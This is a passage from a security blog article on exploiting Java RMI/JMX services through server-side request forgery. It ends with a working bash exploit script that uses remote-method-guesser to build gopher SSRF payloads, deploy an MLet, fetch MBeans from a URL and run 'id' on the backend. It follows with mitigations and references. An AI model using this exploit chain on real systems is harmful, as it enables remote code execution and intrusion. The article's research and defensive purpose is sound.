echo "[+]   JMX Port: ${JMX_PORT}"
echo "[+]   JMX ObjID: ${OBJID}"

echo "[+] Calling newClient()..."
PAYLOAD=$(rmg call 127.0.0.1 ${JMX_PORT} 'null' --objid "${OBJID}" --signature "${SIG_NEW_CLIENT}" --ssrf --encode --gopher --raw)
RESULT=$(ssrf "${PAYLOAD}")

echo "[+]   Parsing newClient() result..."
RESULT=$(rmg call 127.0.0.1 ${JMX_PORT} 'null' --objid "${OBJID}" --signature "${SIG_NEW_CLIENT}" --plugin GenericPrint.jar --no-color --ssrf-response "${RESULT}")
OBJID="[$(echo "${RESULT}" | head -n 4 | tail -n 1 | cut -f3 -d'[')"
echo "[+]   Obtained ObjID: ${OBJID}"

echo "[+] Deploying MLet..."
PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_CREATE_BEAN}" --signature "${SIG_CREATE_BEAN}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
ssrf "${PAYLOAD}" &> /dev/null

echo "[+] Calling getMBeansFromURL()..."
PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_FROM_URL}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
ssrf "${PAYLOAD}" &> /dev/null

echo '[+] Calling execute("id"): '
PAYLOAD=$(rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf --gopher --encode --raw)
RESULT=$(ssrf "${PAYLOAD}")

rmg call localhost ${JMX_PORT} "${ARG_EXEC}" --signature "${SIG_INVOKE}" --objid "${OBJID}" --ssrf-response ${RESULT} --plugin GenericPrint.jar
```


### Mitigations

----

Preventing *Server Side Request Forgery* is a topic on it's own and several useful resources are available [\[5\]\[6\]\[7\]](#references).
However, the attack types discussed in this article demonstrate why it is so important to secure backend services as well. With only a
few configuration changes, none of the above discussed attacks would have worked. So here are some recommendations for securing *RMI services*:

1. Make sure you use an up to date version of *Java*. The security level of *Java RMI* is constantly improving and outdated
   *Java* versions often contain known vulnerabilities. If you are not able to update, you should at least evaluate your current
   security level by looking for known vulnerabilities for your installed *Java* version and usage of vulnerability scanners like
   *remote-method-guesser* [\[2\]](#references). Depending on the installed version of *Java*, workarounds may be possible.
2. Enable *TLS* protected communication for all *RMI* endpoints. Despite *Java RMI* sends mostly binary data that does not look readable,
   it is actually a plain text protocol. All information passed to and received from an *RMI* service is sent in plain text and
   can be read and modified by an attacker with a suitable position inside the network. If possible, you should also consider enabling
   certificate based authentication for your *RMI* services.
3. Implement authentication for your *RMI* services. All *remote objects* that perform sensitive operations should require users
   to authenticate before they can be used. Especially *JMX* services should be password protected and use the *role* model of
   *JMX* to only grant the required amount of privileges to authenticated users [\[8\]](#referneces).
4. Make use of deserialization filters for your *RMI* services and only allow required types to be deserialized [\[9\]](#referneces).
   Also make sure that your applications and third party libraries do not contain classes that perform dangerous actions when being
   deserialized (*deserialization gadgets*).


### Conclusion

----

In this article we demonstrated that *SSRF* attacks on *Java RMI* can work under certain circumstances:

1. The *SSRF* vulnerability needs to allow arbitrary bytes being sent to the backend service (enables attacks on default *RMI* components
   like the *RMI registry*, the *DGC* or the *Activation system*)
2. The *SSRF* vulnerability needs to return responses from the backend service and accept arbitrary bytes within them (enables attacks
   on all *RMI endpoints* like *JMX* or custom *remote objects*)

If both of these conditions are satisfied, a backend *RMI service* can be consumed as with a direct connection
using the *SSRF* vulnerability. If you ever encounter such a service, I would love to hear your experiences regarding
*SSRF* based *RMI* attacks :)

### References

----

* \[1\] [Exploiting Tiny Tiny RSS](https://www.digeex.de/blog/tinytinyrss/)
* \[2\] [remote-method-guesser (GitHub)](https://github.com/qtc-de/remote-method-guesser)
* \[3\] [ssrf-example-server (GitHub)](https://github.com/qtc-de/remote-method-guesser/pkgs/container/remote-method-guesser%2Frmg-ssrf-server)
* \[4\] [GenericPrint rmg Plugin (GitHub)](https://github.com/qtc-de/remote-method-guesser/tree/master/plugins)
* \[5\] [Server-Side Request Forgery Prevention Cheat Sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* \[6\] [Server-side request forgery (PortSwigger)](https://portswigger.net/web-security/ssrf)
* \[7\] [What is server-side request forgery (Acunetix)](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)
* \[8\] [Monitoring and Management Using JMX Technology (Oracle)](https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html)
* \[9\] [Serialization Filtering (Oracle)](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)
